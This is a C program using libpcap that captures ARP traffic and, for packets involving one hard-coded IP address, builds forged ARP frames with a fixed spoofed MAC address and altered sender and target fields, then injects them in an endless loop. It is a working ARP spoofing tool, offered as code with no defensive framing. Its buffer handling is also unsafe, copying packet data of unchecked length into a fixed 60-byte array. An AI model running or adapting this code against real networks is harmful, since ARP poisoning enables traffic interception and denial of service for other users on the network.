#include <pcap.h> 
#include <stdlib.h> 
#include <string.h> 
#include <arpa/inet.h>


/* ARP Header, (assuming Ethernet+IPv4)            */ 
#define ARP_REQUEST 1   /* ARP Request             */ 
#define ARP_REPLY 2     /* ARP Reply               */ 
typedef struct arphdr { 
    u_int16_t htype;    /* Hardware Type           */ 
    u_int16_t ptype;    /* Protocol Type           */ 
    u_char hlen;        /* Hardware Address Length */ 
    u_char plen;        /* Protocol Address Length */ 
    u_int16_t oper;     /* Operation Code          */ 
    u_char sha[6];      /* Sender hardware address */ 
    u_char spa[4];      /* Sender IP address       */ 
    u_char tha[6];      /* Target hardware address */ 
    u_char tpa[4];      /* Target IP address       */ 
}arphdr_t; 

#define MAXBYTES2CAPTURE 2048 



int main(int argc, char *argv[]){

 int i=0; 
 bpf_u_int32 netaddr=0, mask=0;    /* To Store network address and netmask   */ 
 struct bpf_program filter;        /* Place to store the BPF filter program  */ 
 char errbuf[PCAP_ERRBUF_SIZE];    /* Error buffer                           */ 
 pcap_t *descr = NULL;             /* Network interface handler              */ 
 struct pcap_pkthdr pkthdr;        /* Packet information (timestamp,size...) */ 
 const unsigned char *packet=NULL;  /* Received raw data */
 char pck[60];                      
 arphdr_t *arpheader = NULL;       /* Pointer to the ARP header              */ 
 memset(errbuf,0,PCAP_ERRBUF_SIZE); 

if (argc != 2){ 
    printf("USAGE: arpsniffer <interface>\n"); 
    exit(1); 
} 
 /* Open network device for packet capture */ 
 if ((descr = pcap_open_live(argv[1], MAXBYTES2CAPTURE, 0,  512, errbuf))==NULL){
    fprintf(stderr, "ERROR: %s\n", errbuf);
    exit(1);
 }
    
 /* Look up info from the capture device. */ 
 if( pcap_lookupnet( argv[1] , &netaddr, &mask, errbuf) == -1){
     fprintf(stderr, "ERROR: %s\n", errbuf);
    exit(1);
 }

 /* Compiles the filter expression into a BPF filter program */ 
if ( pcap_compile(descr, &filter, "arp", 1, mask) == -1){
    fprintf(stderr, "ERROR: %s\n", pcap_geterr(descr) );
    exit(1);
 }

 /* Load the filter program into the packet capture device. */ 
 if (pcap_setfilter(descr,&filter) == -1){
    fprintf(stderr, "ERROR: %s\n", pcap_geterr(descr) );
    exit(1);
 }


 while(1){ 
 
  if ( (packet = pcap_next(descr,&pkthdr)) == NULL){  /* Get one packet */ 
    fprintf(stderr, "ERROR: Error getting the packet. %s\n", errbuf);
    exit(1);
 }

  arpheader = (struct arphdr *)(packet+14); /* Point to the ARP header */ 

  printf("\n\nReceived Packet Size: %d bytes\n", pkthdr.len); 
  printf("Hardware type: %s\n", (ntohs(arpheader->htype) == 1) ? "Ethernet" : "Unknown"); 
  printf("Protocol type: %s\n", (ntohs(arpheader->ptype) == 0x0800) ? "IPv4" : "Unknown"); 
  printf("Operation: %s\n", (ntohs(arpheader->oper) == ARP_REQUEST)? "ARP Request" : "ARP Reply"); 
 
 /* If is Ethernet and IPv4, print packet contents */ 
  if (ntohs(arpheader->htype) == 1 && ntohs(arpheader->ptype) == 0x0800){ 
   /* printf("Sender MAC: "); 

    for(i=0; i<6;i++)
        printf("%02X:", arpheader->sha[i]); 

    printf("\nSender IP: "); */
	char s[30],t[10];
    memset(s,'\0',30);
    
    for(i=0; i<4;i++)
	{
        printf("%d.", arpheader->spa[i]); 
	sprintf(t,"%d.", arpheader->spa[i]);
        strcat(s,t);
	}

   // printf("\nTarget MAC: "); 

    for(i=0; i<6;i++)
    {
       // printf("%02X:", arpheader->tha[i]); 
        
    }
    //printf("\n\ns=%s\n\n", s);
    
    char s2[30];
    memset(s2,'\0',30);
   // printf("\nTarget IP: "); 

    for(i=0; i<4; i++)
    {
       // printf("%d.", arpheader->tpa[i]); 
        sprintf(t,"%d.", arpheader->tpa[i]); 
        strcat(s2,t);
    }

	printf("s=%s$ s2=%s$\n",s,s2);
    
   // printf("\n"); 
    //if(strcmp(s,"00:00:00:00:00:00:")==0 && strcmp(s2,"192.168.43.124.")==0)
    //if(strcmp(s2,"172.30.34.214")==0)// && (ntohs(arpheader->oper) == ARP_REPLY))
    //if(strcmp(s2,"172.30.34.214")==0)// && (ntohs(arpheader->oper) == ARP_REPLY))
    if(strcmp(s,"172.20.74.244.")==0 || strcmp(s2,"172.20.74.244.")==0)
    //if(strcmp(s2,"192.168.43.124")==0 && (ntohs(arpheader->oper) != ARP_REPLY))
    {

	printf("Sender MAC: "); 

    for(i=0; i<6;i++)
        printf("%02X:", arpheader->sha[i]); 

    printf("\nSender IP: "); 

    for(i=0; i<4;i++)
        printf("%d.", arpheader->spa[i]); 

    printf("\nTarget MAC: "); 

    for(i=0; i<6;i++)
    {
        printf("%02X:", arpheader->tha[i]); 
    }
    printf("\nTarget IP: "); 

    for(i=0; i<4; i++)
    {
        printf("%d.", arpheader->tpa[i]); 
    }
    
    printf("\n"); 
      /*for(int i=0;i<6;i++)
        arpheader->tha[i]=12;
      pcap_sendpacket(descr,packet,sizeof(packet));
      pcap_perror(descr,"inject");
      printf("injected\n");*/
      //pck=packet;
      strcpy(pck,packet);
      for(int i=0;i<pkthdr.len;i++)
        pck[i]=packet[i];
     /* pck[20]=0x00;
      pck[21]=0x02;*/

      pck[22]=0x28;
      pck[23]=0xf1;
      pck[24]=0x0e;
      pck[25]=0x3a;
      pck[26]=0xd4;
      pck[27]=0x42;
      pck[28]=arpheader->tpa[0];
      pck[29]=arpheader->tpa[1];
      pck[30]=arpheader->tpa[2];
      pck[31]=arpheader->tpa[3];
      pck[32]=packet[22];
      pck[33]=packet[23];
      pck[34]=packet[24];
      pck[35]=packet[25];
      pck[36]=packet[26];
      pck[37]=packet[27];

      pck[38]=172;//0x00;//packet[28];
      pck[39]=30;//0x00;//packet[29];
      pck[40]=135;//0x00;//packet[30];
      pck[41]=255;//0x00;//packet[31];

      //sleep(5);
      while(1){
      if(pcap_sendpacket(descr,pck,sizeof(pck))<0)
        pcap_perror(descr,"inject");
      else
        printf("injected\n");}
      /*pck[41]=1;
      sleep(5);
      if(pcap_sendpacket(descr,pck,sizeof(pck))<0)
        pcap_perror(descr,"inject");
      else
        printf("injected\n");

      pck[41]=150;
      sleep(5);
      if(pcap_sendpacket(descr,pck,sizeof(pck))<0)
        pcap_perror(descr,"inject");
      else
        printf("injected\n");*/

    }
  } 

 } 

return 0; 

}
